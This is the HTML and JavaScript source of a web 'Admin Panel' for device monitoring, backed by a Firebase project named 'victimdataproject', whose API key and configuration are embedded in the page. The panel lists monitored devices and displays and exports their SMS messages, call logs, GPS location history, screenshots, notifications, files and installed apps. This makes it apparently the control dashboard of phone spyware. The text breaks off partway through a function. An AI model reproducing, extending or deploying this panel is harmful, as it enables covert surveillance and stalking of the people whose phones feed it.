<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel - Device Monitoring</title>

    <!-- Bootstrap 5 CDN -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Font Awesome CDN -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Leaflet CSS for Maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css" />

    <style>
        :root {
            --primary-color: #0d6efd; 
            --secondary-color: #6c757d; 
            --light-gray: #f8f9fa; 
            --dark-gray: #343a40;
            --sidebar-width: 260px;
            --topbar-height: 60px;
            --content-padding: 1.5rem;
        }

        html {
            scroll-behavior: smooth;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--light-gray); 
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(255, 255, 255, 0.85); 
            z-index: 10000; 
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        #login-container {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            background-color: var(--light-gray); 
        }
        .login-card {
            width: 100%;
            max-width: 400px; 
            padding: 2.5rem 2rem; 
            background-color: #ffffff; 
            border-radius: 12px; 
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1); 
            border: none; 
        }
        .login-icon-wrapper { 
            text-align: center;
            margin-bottom: 1.5rem; 
        }
        .login-icon-wrapper .fas { 
            font-size: 3.5rem; 
            color: var(--primary-color);
        }
        .login-card .card-title {
            font-weight: 600; 
            color: var(--dark-gray);
            margin-bottom: 1.5rem; 
            font-size: 1.75rem; 
        }
        .login-card .form-label {
            font-weight: 500; 
            margin-bottom: 0.3rem;
            color: #495057; 
        }
        .login-card .form-control {
            border-radius: 8px; 
            padding: 0.85rem 1rem; 
            border: 1px solid #ced4da;
            transition: border-color .15s ease-in-out,box-shadow .15s ease-in-out;
        }
        .login-card .form-control::placeholder { 
            color: #999;
            font-size: 0.9rem;
        }
        .login-card .form-control:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 0.25rem rgba(13, 110, 253, 0.25);
        }
        .login-card .btn-primary {
            background-color: var(--primary-color);
            border-color: var(--primary-color);
            padding: 0.85rem; 
            font-weight: 500;
            font-size: 1rem;
            border-radius: 8px;
            transition: background-color .15s ease-in-out,border-color .15s ease-in-out;
        }
        .login-card .btn-primary:hover {
            background-color: #0b5ed7;
            border-color: #0a58ca;
        }
        #login-error {
            font-size: 0.875rem; 
            margin-top: 1rem; 
            padding: 0.75rem 1rem;
            border-radius: 8px;
            background-color: #f8d7da; 
            border: 1px solid #f5c2c7; 
            color: #842029; 
        }

        #dashboard-container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        #sidebar {
            width: var(--sidebar-width);
            background-color: #fff; 
            border-right: 1px solid #dee2e6;
            position: fixed;
            top: 0; 
            bottom: 0;
            left: 0;
            z-index: 1020; 
            transition: transform 0.3s ease-in-out;
            display: flex; 
            flex-direction: column; 
        }

        #sidebar .sidebar-brand {
            height: var(--topbar-height); 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 0 1.25rem; 
            font-size: 1.5rem;
            font-weight: bold;
            color: var(--primary-color);
            text-align: center;
            border-bottom: 1px solid #e9ecef; 
            flex-shrink: 0; 
        }

        #sidebar-inner-content {
            flex-grow: 1; 
            overflow-y: auto; 
            box-sizing: border-box;
        }
        
        #sidebar-inner-content .nav { 
            padding-top: 0.5rem; 
            padding-bottom: 0.5rem; 
        }

        #sidebar .nav-link {
            color: #333;
            padding: 0.75rem 1.25rem;
            display: flex;
            align-items: center;
        }
        #sidebar .nav-link .fa-fw {
            margin-right: 0.75rem;
        }
        #sidebar .nav-link.active, #sidebar .nav-link:hover {
            background-color: var(--primary-color);
            color: #fff;
        }

        #topbar {
            height: var(--topbar-height);
            background-color: #fff; 
            border-bottom: 1px solid #dee2e6;
            display: flex; 
            align-items: center; 
            padding: 0 var(--content-padding);
            position: fixed;
            top: 0;
            left: var(--sidebar-width); 
            right: 0;
            z-index: 1030; 
        }
        
        #topbar-right-group {
            margin-left: auto; 
            display: flex;
            align-items: center;
        }
        
        #device-selector { 
            text-align: center;
            text-align-last: center; 
        }
        
        #main-content-wrapper {
            margin-left: var(--sidebar-width);
            padding-top: var(--topbar-height);
            flex-grow: 1;
            transition: margin-left 0.3s ease-in-out;
        }
        #main-content {
            padding: var(--content-padding);
        }

        .tab-pane { display: none; animation: fadeIn 0.5s; }
        .tab-pane.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .card-header .btn-export { font-size: 0.8rem; }
        .editable-alias { display: flex; align-items: center; }
        .editable-alias input { margin-right: 0.5rem; }
        #gps-map { height: 400px; width: 100%; border-radius: 0.25rem; }
        #gps-map.loading-map { display: flex; align-items: center; justify-content: center; background-color: #e9ecef; }
        .screenshot-item img { max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 10px; }
        .screenshot-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1rem; }
        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .status-online { background-color: #28a745; }
        .status-offline { background-color: #dc3545; }

        .sidebar-toggler { display: none; } 

        @media (max-width: 991.98px) { /* Mobile View */
            #sidebar {
                transform: translateX(-100%);
            }
            #sidebar.active {
                transform: translateX(0);
                z-index: 1025; 
            }
            
            #sidebar .sidebar-brand {
                height: auto; 
                padding: 0.75rem 1.25rem; 
                padding-top: calc(var(--topbar-height) + 0.5rem); 
                border-bottom: 1px solid #e9ecef; 
            }
            #sidebar-inner-content .nav { 
                padding-top: 0.5rem; 
            }

            #main-content-wrapper {
                margin-left: 0;
            }
            #topbar {
                left: 0; 
                z-index: 1030; 
                justify-content: space-between; 
            }
            .sidebar-toggler { 
                display: block; 
            }
            #topbar-device-selector-container {
                margin-left: 0.5rem; 
                margin-right: 0.5rem; 
            }
            #device-selector { 
                /* min-width: 170px; /* Optional if fixed width is set */
                width: 170px; /* MODIFIED: Fixed width for mobile dropdown */
                overflow: hidden; /* MODIFIED: Handle long text */
                text-overflow: ellipsis; /* MODIFIED: Show ellipsis for long text */
            }
            #topbar-right-group { 
                margin-left: 0; 
            }
        }

        @media (min-width: 992px) { /* Desktop View */
            .sidebar-toggler {
                display: none !important; 
            }
            #topbar-device-selector-container {
                margin-left: 1rem; 
                margin-right: auto; 
                display: flex;         
                align-items: center;   
            }
            #topbar-device-selector-container .form-label {
                white-space: nowrap; 
            }
            #device-selector { 
                min-width: 250px; 
            }
        }

        .table-responsive { overflow-x: auto; }
        .data-table th, .data-table td { white-space: nowrap; }
        .data-table .wrap-text { white-space: normal; }
    </style>
</head>
<body>

    <div id="loading-overlay">
        <div class="spinner-border text-primary" role="status">
            <span class="visually-hidden">Loading...</span>
        </div>
    </div>

    <div id="login-container">
        <div class="card login-card"> 
            <div class="card-body">
                <div class="login-icon-wrapper">
                    <i class="fas fa-user-shield"></i> 
                </div>
                <h3 class="card-title text-center">Admin Panel Login</h3> 
                <form id="login-form">
                    <div class="mb-3">
                        <label for="email" class="form-label">Email address</label>
                        <input type="email" class="form-control" id="email" placeholder="e.g., admin@example.com" required>
                    </div>
                    <div class="mb-4"> 
                        <label for="password" class="form-label">Password</label>
                        <input type="password" class="form-control" id="password" placeholder="Enter your password" required>
                    </div>
                    <button type="submit" class="btn btn-primary w-100">Login</button>
                    <div id="login-error" class="text-danger mt-3 text-center" style="display: none;"></div>
                </form>
            </div>
        </div>
    </div>

    <div id="dashboard-container" style="display: none;">
        <nav id="topbar" class="shadow-sm">
            <button class="btn btn-light sidebar-toggler" type="button" id="sidebarToggle">
                <i class="fas fa-bars"></i>
            </button>

            <div class="dropdown" id="topbar-device-selector-container"> 
                <label for="device-selector" class="form-label me-2 d-none d-sm-inline">Select Device:</label>
                <select id="device-selector" class="form-select form-select-sm d-inline-block">
                     <option value="">-- Select Device --</option>
                </select>
            </div>
            
            <div id="topbar-right-group"> 
                <span id="admin-email" class="me-3 d-none d-md-inline"></span>
                <button id="logout-button" class="btn btn-outline-danger btn-sm">
                    <i class="fas fa-sign-out-alt me-1"></i> Logout
                </button>
            </div>
        </nav>

        <nav id="sidebar" class="shadow-sm">
            <div class="sidebar-brand">
                <i class="fas fa-shield-alt"></i> Admin Panel
            </div>
            <div id="sidebar-inner-content">
                <ul class="nav flex-column">
                    <li class="nav-item">
                        <a class="nav-link active" href="#overview" data-tab="overview-content"><i class="fas fa-tachometer-alt fa-fw"></i> Device Overview</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#messages" data-tab="messages-content"><i class="fas fa-envelope fa-fw"></i> Messages</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#calls" data-tab="calls-content"><i class="fas fa-phone-alt fa-fw"></i> Call Logs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#apps" data-tab="apps-content"><i class="fas fa-th-large fa-fw"></i> Installed Apps</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#battery" data-tab="battery-content"><i class="fas fa-battery-full fa-fw"></i> Battery Info</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#gps" data-tab="gps-content"><i class="fas fa-map-marker-alt fa-fw"></i> GPS Location</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#files" data-tab="files-content"><i class="fas fa-folder-open fa-fw"></i> File Logs</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#screenshots" data-tab="screenshots-content"><i class="fas fa-camera fa-fw"></i> Screenshots</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#notifications" data-tab="notifications-content"><i class="fas fa-bell fa-fw"></i> Notifications</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="#device-info" data-tab="device-info-content"><i class="fas fa-info-circle fa-fw"></i> Device Info</a>
                    </li>
                </ul>
            </div>
        </nav>

        <div id="main-content-wrapper">
            <main id="main-content">
                <!-- Tab content -->
                <div id="overview-content" class="tab-pane active">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Device Overview</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="overview">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="overview-data">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="messages-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Messages (SMS)</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="sms">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="messages-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="calls-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Call Logs</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="calls">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="calls-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="apps-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Installed Apps</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="apps">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="apps-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="battery-content" class="tab-pane">
                     <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Battery Info</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="battery">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="battery-data">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="gps-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>GPS Location</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="gps">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="gps-map-container" class="mb-3">
                        <div id="gps-map">
                            <p class="text-muted p-3">Please select a device to view location on map.</p>
                        </div>
                    </div>
                    <div id="gps-history-data" class="table-responsive">
                         <p class="text-muted">Location history will appear here once a device is selected.</p>
                    </div>
                </div>

                <div id="files-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>File Logs</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="files">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="files-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="screenshots-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Screenshots</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="screenshots">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="screenshots-data" class="screenshot-grid">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="notifications-content" class="tab-pane">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Notifications</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="notifications">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="notifications-data" class="table-responsive">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>

                <div id="device-info-content" class="tab-pane">
                     <div class="d-flex justify-content-between align-items-center mb-3">
                        <h2>Device Info</h2>
                        <button class="btn btn-sm btn-outline-secondary btn-export" data-section="info">
                            <i class="fas fa-download me-1"></i> Export CSV
                        </button>
                    </div>
                    <div id="device-info-data">
                        <p class="text-muted">Please select a device from the dropdown above to view its data.</p>
                    </div>
                </div>
            </main>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>

    <script type="module">
        // JavaScript code remains IDENTICAL to the previous "perfect" version.
        const firebaseConfig = {
            apiKey: "AIzaSyADpoTdgf5MZn7yPplT_cSRA8fngJvjibw",
            authDomain: "victimdataproject.firebaseapp.com",
            databaseURL: "https://victimdataproject-default-rtdb.firebaseio.com/",
            projectId: "victimdataproject",
            storageBucket: "victimdataproject.appspot.com",
            messagingSenderId: "938788267301",
            appId: "1:938788267301:web:cdcff391160dce48fa66cc"
        };

        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getAuth, onAuthStateChanged, signInWithEmailAndPassword, signOut as firebaseSignOut } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-auth.js";
        import { getDatabase, ref, onValue, off, set, update, get, child } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        const loadingOverlay = document.getElementById('loading-overlay');
        const loginContainer = document.getElementById('login-container');
        const loginForm = document.getElementById('login-form');
        const loginError = document.getElementById('login-error');
        const dashboardContainer = document.getElementById('dashboard-container');
        const adminEmailEl = document.getElementById('admin-email');
        const logoutButton = document.getElementById('logout-button');
        const sidebarLinks = document.querySelectorAll('#sidebar .nav-link');
        const tabPanes = document.querySelectorAll('.tab-pane');
        const deviceSelector = document.getElementById('device-selector');
        const sidebarToggler = document.getElementById('sidebarToggle');
        const sidebar = document.getElementById('sidebar');

        let currentUser = null;
        let currentDeviceUid = null;
        let activeListeners = {};
        let map = null;
        let currentDeviceDataCache = {};

        const showLoading = (show = true) => {
            loadingOverlay.style.display = show ? 'flex' : 'none';
        };

        const formatTimestamp = (timestamp) => {
            if (!timestamp) return 'N/A';
            const ts = String(timestamp).length === 10 ? timestamp * 1000 : timestamp;
            try {
                return new Date(ts).toLocaleString();
            } catch (e) {
                return 'Invalid Date';
            }
        };

        const sanitizeHTML = (str) => {
            const temp = document.createElement('div');
            temp.textContent = str;
            return temp.innerHTML;
        };

        const createTable = (dataArray, headers, sectionNameForMsg) => {
            if (!currentDeviceUid) {
                 return `<p class="text-muted">Please select a device from the dropdown above to view its data.</p>`;
            }
            if (!dataArray || dataArray.length === 0) {
                return `<p class="text-muted">No ${sectionNameForMsg || 'data'} found for this device.</p>`;
            }
            let html = '<table class="table table-striped table-hover table-sm data-table">';
            html += '<thead><tr>';
            headers.forEach(header => html += `<th>${sanitizeHTML(header.label)}</th>`);
            html += '</tr></thead><tbody>';
            dataArray.forEach(item => {
                html += '<tr>';
                headers.forEach(header => {
                    let value = item[header.key] !== undefined && item[header.key] !== null ? item[header.key] : 'N/A';
                    if (header.formatter) {
                        value = header.formatter(value, item);
                    }
                    if (typeof value === 'object' && value !== null) {
                        value = JSON.stringify(value);
                    }
                    html += `<td class="${header.wrap ? 'wrap-text' : ''}">${sanitizeHTML(String(value))}</td>`;
                });
                html += '</tr>';
            });
            html += '</tbody></table>';
            return html;
        };
        
        const displayKeyValuePairs = (dataObject, containerId, sectionNameForMsg) => {
            const container = document.getElementById(containerId);
            currentDeviceDataCache[sectionNameForMsg] = [];
             if (!currentDeviceUid) {
                container.innerHTML = `<p class="text-muted">Please select a device from the dropdown above to view its data.</p>`;
                return;
            }
            if (!dataObject || Object.keys(dataObject).length === 0) {
                container.innerHTML = `<p class="text-muted">No ${sectionNameForMsg || 'data'} found for this device.</p>`;
                return;
            }
            let html = '<dl class="row">';
            const exportData = {};
            for (const key in dataObject) {
                const value = dataObject[key] !== undefined && dataObject[key] !== null ? dataObject[key] : 'N/A';
                html += `<dt class="col-sm-3 text-capitalize">${sanitizeHTML(key.replace(/_/g, ' '))}</dt>`;
                html += `<dd class="col-sm-9">${sanitizeHTML(String(value))}</dd>`;
                exportData[key] = value;
            }
            html += '</dl>';
            container.innerHTML = html;
            currentDeviceDataCache[sectionNameForMsg] = [exportData];
        };

        const clearDashboardData = (showSelectDeviceMessage = true) => {
            const defaultMessage = '<p class="text-muted">No data available for this section.</p>';
            const selectDevicePrompt = '<p class="text-muted">Please select a device from the dropdown above to view its data.</p>';
            
            const messageToDisplay = showSelectDeviceMessage || !currentDeviceUid ? selectDevicePrompt : defaultMessage;

            const overviewDataEl = document.getElementById('overview-data');
            if (overviewDataEl) {
                 overviewDataEl.innerHTML = messageToDisplay;
            }
            
            tabPanes.forEach(pane => {
                if (pane.id === 'overview-content') return;

                const dataContainer = pane.querySelector('div[id$="-data"], div[id$="-grid"], div[id$="-map"]');
                if (dataContainer) {
                    dataContainer.innerHTML = messageToDisplay;
                }
                 if (pane.id === 'gps-content') {
                    const mapDiv = document.getElementById('gps-map');
                    if (mapDiv) {
                        mapDiv.innerHTML = `<p class="text-muted p-3">${messageToDisplay.replace("its data", "location on map.")}</p>`;
                         mapDiv.classList.remove('loading-map');
                    }
                    if (map) {
                        map.eachLayer(layer => { if (!!layer.toGeoJSON) map.removeLayer(layer); });
                        map.setView([0,0], 2);
                    }
                    const historyContainer = document.getElementById('gps-history-data');
                    if(historyContainer) historyContainer.innerHTML = messageToDisplay.replace("its data", "location history.");
                }
            });
            currentDeviceDataCache = {};
        };

        onAuthStateChanged(auth, (user) => {
            showLoading(false);
            if (user) {
                currentUser = user;
                adminEmailEl.innerHTML = `<i class="fas fa-user-shield me-1"></i> ${sanitizeHTML(user.email || 'Admin')}`;
                loginContainer.style.display = 'none';
                dashboardContainer.style.display = 'flex';
                
                loadDeviceList(); 
                clearDashboardData(true);

            } else { 
                currentUser = null;
                loginContainer.style.display = 'flex';
                dashboardContainer.style.display = 'none';
                
                if(currentDeviceUid) detachAllListeners();
                
                currentDeviceUid = null; 

                adminEmailEl.innerHTML = '';
                deviceSelector.innerHTML = '<option value="">-- Select Device --</option>';
                deviceSelector.value = "";

                clearDashboardData(true); 
            }
        });

        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            showLoading();
            loginError.style.display = 'none';
            const email = loginForm.email.value;
            const password = loginForm.password.value;
            try {
                await signInWithEmailAndPassword(auth, email, password);
            } catch (error) {
                console.error("Login error:", error.code, error.message);
                let errorMessage = "Login failed. Please check your credentials and try again.";
                switch (error.code) {
                    case 'auth/user-not-found':
                    case 'auth/invalid-credential': 
                        errorMessage = "Incorrect email or password. Please try again.";
                        break;
                    case 'auth/wrong-password': 
                        errorMessage = "Incorrect password. Please try again.";
                        break;
                    case 'auth/invalid-email':
                        errorMessage = "The email address format is not valid.";
                        break;
                    case 'auth/too-many-requests':
                        errorMessage = "Access to this account has been temporarily disabled due to many failed login attempts. You can immediately restore it by resetting your password or you can try again later.";
                        break;
                    case 'auth/network-request-failed':
                        errorMessage = "Network error. Please check your internet connection.";
                        break;
                }
                loginError.textContent = errorMessage;
                loginError.style.display = 'block';
            } finally {
                showLoading(false);
            }
        });

        logoutButton.addEventListener('click', async () => {
            showLoading();
            try {
                await firebaseSignOut(auth);
            } catch (error) {
                console.error("Logout error:", error);
            } finally {
                showLoading(false);
            }
        });

        sidebarLinks.forEach(link => {
            link.addEventListener('click', (e) => {
                e.preventDefault();
                sidebarLinks.forEach(l => l.classList.remove('active'));
                link.classList.add('active');
                
                const targetTabId = link.getAttribute('data-tab');
                tabPanes.forEach(pane => {
                    pane.classList.remove('active');
                    if (pane.id === targetTabId) {
                        pane.classList.add('active');
                    }
                });

                if (currentDeviceUid) { 
                    loadDataForActiveTab();
                } else { 
                    const targetPane = document.getElementById(targetTabId);
                    if (targetPane) {
                        const dataContainer = targetPane.querySelector('div[id$="-data"], div[id$="-grid"], div[id$="-map"]');
                        const promptMsg = '<p class="text-muted">Please select a device from the dropdown above to view its data.</p>';
                        if (dataContainer) dataContainer.innerHTML = promptMsg;
                        
                        if (targetTabId === 'gps-content') { 
                            const mapDiv = document.getElementById('gps-map');
                            if(mapDiv) mapDiv.innerHTML = `<p class="text-muted p-3">Please select a device to view location on map.</p>`;
                            const historyContainer = document.getElementById('gps-history-data');
                            if(historyContainer) historyContainer.innerHTML = `<p class="text-muted">Location history will appear here once a device is selected.</p>`;
                            if (map) map.setView([0,0],2); 
                        }
                    }
                }
                if (window.innerWidth < 992 && sidebar.classList.contains('active')) { 
                    sidebar.classList.remove('active');
                }
            });
        });

        sidebarToggler.addEventListener('click', () => {
            sidebar.classList.toggle('active');
        });

        const loadDeviceList = () => {
            const devicesRef = ref(db, 'devices');
            if (activeListeners['deviceList'] && typeof activeListeners['deviceList'] === 'function') {
                activeListeners['deviceList'](); 
            }

            const deviceListListener = onValue(devicesRef, (snapshot) => {
                const devices = snapshot.val();
                
                deviceSelector.innerHTML = '<option value="">-- Select Device --</option>';
                let currentDeviceFromStateStillExists = false; 

                if (devices) {
                    Object.keys(devices).forEach(uid => {
                        const alias = devices[uid]?.info?.alias || uid;
                        const option = document.createElement('option');
                        option.value = uid;
                        option.textContent = sanitizeHTML(alias);
                        deviceSelector.appendChild(option);

                        if (uid === currentDeviceUid) { 
                            currentDeviceFromStateStillExists = true;
                        }
                    });
                }

                if (currentDeviceUid && currentDeviceFromStateStillExists) {
                    deviceSelector.value = currentDeviceUid;
                } else if (currentDeviceUid && !currentDeviceFromStateStillExists) {
                    console.warn(`Device ${currentDeviceUid} no longer exists. Clearing selection state.`);
                    currentDeviceUid = null; 
                    deviceSelector.value = ""; 
                    clearDashboardData(true); 
                } else {
                    deviceSelector.value = ""; 
                    if (!devices) { 
                        clearDashboardData(true);
                    }
                }

            }, (error) => {
                console.error("Error loading device list:", error);
                deviceSelector.innerHTML = '<option value="">Error loading devices</option>';
                clearDashboardData(true); 
            });
            activeListeners['deviceList'] = deviceListListener;
        };
        
        deviceSelector.addEventListener('change', (e) => {
            selectDevice(e.target.value); 
        });

        function selectDevice(uid) {
            Object.keys(activeListeners).forEach(key => {
                if (key !== 'deviceList' && typeof activeListeners[key] === 'function') {
                    activeListeners[key]();
                    delete activeListeners[key];
                }
            });
            
            currentDeviceUid = uid; 

            if (uid) { 
                loadDataForActiveTab(); 
            } else { 
                clearDashboardData(true); 
            }
        }
        
        async function updateDeviceAliasInSelector(uidToUpdate) { 
            if (!uidToUpdate) return;
            try {
                const aliasSnapshot = await get(child(ref(db, 'devices'), `${uidToUpdate}/info/alias`));
                if (aliasSnapshot.exists()) {
                    const alias = aliasSnapshot.val();
                    const option = deviceSelector.querySelector(`option[value="${uidToUpdate}"]`);
                    if (option && option.textContent !== alias) { 
                         option.textContent = sanitizeHTML(alias);
                    }
                }
            } catch (error) {
                console.error("Error fetching alias for selector update:", error);
            }
        }

        const detachAllListeners = () => { 
            Object.values(activeListeners).forEach(detachFn => {
                if (typeof detachFn === 'function') {
                    detachFn();
                }
            });
            activeListeners = {};
        };

        const listenToDbPath = (path, callback, sectionName) => {
            if (activeListeners[sectionName] && typeof activeListeners[sectionName] === 'function') {
                activeListeners[sectionName](); 
            }
            const dataRef = ref(db, path);
            const listener = onValue(dataRef, (snapshot) => {
                if (path.includes(currentDeviceUid) || sectionName === 'deviceList' || !path.startsWith('devices/')) {
                    callback(snapshot.val());
                }
            }, (error) => {
                console.error(`Error fetching ${sectionName}:`, error);
                const containerId = `${sectionName}-data`;
                const container = document.getElementById(containerId) || 
                                  document.getElementById(`${sectionName}-content`)?.querySelector('div[id$="-data"], div[id$="-grid"]') ||
                                  (sectionName === 'gps' ? document.getElementById('gps-map') : null);

                if (container) {
                     container.innerHTML = `<p class="text-danger">Error loading ${sectionName.replace('-', ' ')} data.</p>`;
                     if (sectionName === 'gps') { 
                        const historyContainer = document.getElementById('gps-history-data');
                        if (historyContainer) historyContainer.innerHTML = ''; 
                     }
                }
            });
            activeListeners[sectionName] = listener; 
        };
        
        const loadDataForActiveTab = () => {
            if (!currentDeviceUid) { 
                clearDashboardData(true); 
                return;
            }
            const activeTabLink = document.querySelector('#sidebar .nav-link.active');
            if (!activeTabLink) return;

            const tabId = activeTabLink.getAttribute('data-tab'); 
            
            document.querySelectorAll('.tab-pane .spinner-border').forEach(s => s.remove()); 
            const targetPane = document.getElementById(tabId);
            if (targetPane) {
                 const dataContainer = targetPane.querySelector('div[id$="-data"], div[id$="-grid"], div[id$="-map"]');
                 if (dataContainer && !dataContainer.querySelector('.spinner-border')) { 
                    if (tabId === 'gps-content') { 
                        const mapDiv = document.getElementById('gps-map');
                        const historyDiv = document.getElementById('gps-history-data');
                        if (mapDiv) { 
                             mapDiv.innerHTML = '<div class="d-flex justify-content-center align-items-center h-100"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading map...</span></div></div>';
                             mapDiv.classList.add('loading-map'); 
                        }
                        if (historyDiv && !historyDiv.querySelector('.spinner-border')) historyDiv.innerHTML = '<div class="d-flex justify-content-center mt-1"><div class="spinner-border spinner-border-sm text-primary" role="status"></div></div>';
                    } else if (dataContainer){ 
                        dataContainer.innerHTML = '<div class="d-flex justify-content-center mt-3"><div class="spinner-border text-primary" role="status"><span class="visually-hidden">Loading...</span></div></div>';
                    }
                 }
            }

            switch (tabId) {
                case 'overview-content': loadOverviewData(); break;
                case 'messages-content': loadSmsData(); break;
                case 'calls-content': loadCallLogsData(); break;
                case 'apps-content': loadAppsData(); break;
                case 'battery-content': loadBatteryData(); break;
                case 'gps-content': loadGpsData(); break;
                case 'files-content': loadFilesData(); break;
                case 'screenshots-content': loadScreenshotsData(); break;
                case 'notifications-content': loadNotificationsData(); break;
                case 'device-info-content': loadDeviceInfoData(); break;
            }
        };

        const loadOverviewData = () => {
            if (!currentDeviceUid) return;
            const path = `devices/${currentDeviceUid}/info`;
            listenToDbPath(path, (data) => {
                const container = document.getElementById('overview-data');
                currentDeviceDataCache.overview = []; 
                if (!data && currentDeviceUid) { 
                    container.innerHTML = '<p class="text-muted">No overview data found for this device. It might be a new device or data is yet to sync.</p>';
                    return;
                } else if (!data) { 
                    container.innerHTML = '<p class="text-muted">Please select a device.</p>';
                    return;
                }

                const alias = data.alias || currentDeviceUid;
                const lastSeen = data.lastSeen ? parseInt(data.lastSeen) : null;
                const fiveMinutesAgo = Date.now() - (5 * 60 * 1000);
                const isOnline = lastSeen && lastSeen > fiveMinutesAgo;
                
                const overviewItems = [
                    { label: "Device UID", value: currentDeviceUid },
                    { label: "Alias", value: alias, editable: true },
                    { label: "Status", value: `<span class="status-dot ${isOnline ? 'status-online' : 'status-offline'}"></span> ${isOnline ? 'Online' : 'Offline'}` },
                    { label: "Last Seen", value: formatTimestamp(lastSeen) }
                ];

                let html = '<div class="list-group">';
                const exportData = {};
                overviewItems.forEach(item => {
                    html += `<div class="list-group-item">
                                <div class="row align-items-center">
                                    <div class="col-sm-3"><strong>${item.label}:</strong></div>
                                    <div class="col-sm-9">`;
                    if (item.editable) {
                        html += `<div class="editable-alias input-group input-group-sm">
                                    <input type="text" class="form-control form-control-sm" id="editable-alias-input" value="${sanitizeHTML(String(item.value))}">
                                    <button class="btn btn-outline-success btn-sm" id="save-alias-btn"><i class="fas fa-save"></i></button>
                                 </div>`;
                    } else {
                        html += item.value; 
                    }
                    html += `   </div></div></div>`;
